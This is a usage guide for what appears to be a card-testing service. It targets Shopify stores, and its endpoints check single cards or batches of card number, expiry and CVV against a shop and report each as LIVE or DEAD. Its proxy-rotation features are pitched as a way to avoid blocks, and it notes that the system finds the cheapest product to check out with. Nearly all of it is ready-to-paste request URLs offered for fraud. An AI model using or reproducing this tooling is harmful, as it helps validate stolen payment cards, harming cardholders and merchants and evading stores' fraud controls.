# 🚀 SIMPLE API GUIDE - All Commands

Replace `YOUR-API-URL` with your actual URL (e.g., `https://your-app.onrender.com`)

---

## 📋 TABLE OF CONTENTS

1. [Card Checking](#card-checking) - Check if cards work
2. [URL Management](#url-management) - Set default shop
3. [Proxy Management](#proxy-management) - Add/manage proxies
4. [Site Testing](#site-testing) - Test Shopify sites

---

## 💳 CARD CHECKING

### ✅ Check 1 Card (with site)
```
YOUR-API-URL/shopify.py?lista=https://shop.com|4532123456789012|12|25|123
```
Format: `site|card|month|year|cvv`

### ✅ Check 1 Card (with global URL)
```
YOUR-API-URL/sh?lista=4532123456789012|12|25|123
```
Format: `card|month|year|cvv`

### ✅ Check Multiple Cards (up to 10)
```
YOUR-API-URL/msh?cards=4532|12|25|123,4556|01|26|456&site=https://shop.com
```
Format: `card1,card2,card3` (comma separated)

### ✅ Check Multiple Cards (with global URL)
```
YOUR-API-URL/msh?cards=4532|12|25|123,4556|01|26|456
```

---

## 🌐 URL MANAGEMENT

### Set Global URL (so you don't need to type site every time)
```
YOUR-API-URL/seturl?url=https://shop.myshopify.com
```

### Check Current Global URL
```
YOUR-API-URL/myurl
```

### Remove Global URL
```
YOUR-API-URL/rmurl
```

---

## 🔌 PROXY MANAGEMENT (GLOBAL - Auto-applies to ALL card checks!)

### Add a Proxy (automatically used for ALL card checks)
```
YOUR-API-URL/addp?proxy=http://user:pass@proxy.com:8080
```
✅ **Once added, ALL card checks automatically use your proxies!**

### List All Proxies
```
YOUR-API-URL/lp
```

### Remove Specific Proxy (by number)
```
YOUR-API-URL/rp?index=2
```

### Remove ALL Proxies
```
YOUR-API-URL/rp
```

### Check If Proxy Works
```
YOUR-API-URL/cp
```

**💡 How Global Proxies Work:**
- Add proxy once → It applies to ALL future card checks automatically
- Multiple proxies → System rotates between them automatically  
- No need to specify proxy for each request!
- Works with `/shopify.py`, `/sh`, and `/msh` endpoints

---

## 🧪 SITE TESTING

### Test 1 Shopify Site
```
YOUR-API-URL/chkurl?url=https://shop.myshopify.com
```

### Test Multiple Sites (up to 20)
```
YOUR-API-URL/mchku?urls=https://shop1.com,https://shop2.com,https://shop3.com
```

---

## 🎯 QUICK WORKFLOW EXAMPLES

### Example 1: Quick Card Check
```
1. Just check the card:
   YOUR-API-URL/shopify.py?lista=https://shop.com|4532123456789012|12|25|123
```

### Example 2: Set Global URL + Check Cards
```
1. Set global URL:
   YOUR-API-URL/seturl?url=https://shop.myshopify.com

2. Check single card:
   YOUR-API-URL/sh?lista=4532123456789012|12|25|123

3. Check multiple cards:
   YOUR-API-URL/msh?cards=4532|12|25|123,4556|01|26|456
```

### Example 3: Use Proxies
```
1. Add proxy:
   YOUR-API-URL/addp?proxy=http://user:pass@proxy.com:8080

2. Check all proxies:
   YOUR-API-URL/lp

3. Test proxy:
   YOUR-API-URL/cp

4. Now check cards (will use proxy automatically):
   YOUR-API-URL/shopify.py?lista=https://shop.com|4532|12|25|123
```

---

## 📊 RESPONSE MEANINGS

| Status | Meaning |
|--------|---------|
| **LIVE** | ✅ Card is valid/approved |
| **DEAD** | ❌ Card is invalid/declined |
| **ERROR** | ⚠️ System error |

---

## 💡 PRO TIPS

1. **Global URL**: Set once with `/seturl`, then skip site parameter in all requests
2. **Global Proxies**: Add once with `/addp`, automatically used for ALL card checks
3. **Avoid Blocks**: Use proxies when checking many cards - they rotate automatically
4. **Test First**: Use `/chkurl` to verify site works before checking cards
5. **Browser Ready**: Just paste any URL in your browser - works instantly!
6. **Cheapest Product**: System automatically finds and uses the cheapest available product on any site
7. **Multiple Proxies**: Add multiple proxies - system rotates between them automatically

---

## 🔗 MORE HELP

- **Full Guide**: See `API_USAGE.md` for detailed examples
- **Deployment**: See `README.md` for setup instructions
- **Quick Start**: See `QUICK_START.md` for common tasks

---

## ⚡ CARD FORMAT REMINDER

Always use this format:
```
card_number|month|year|cvv
```

Example:
```
4532123456789012|12|25|123
```

- Card: 16 digits
- Month: 2 digits (01-12)
- Year: 2 digits (25 = 2025)
- CVV: 3-4 digits

---

**That's it! Just copy and paste these URLs into your browser or code! 🎉**
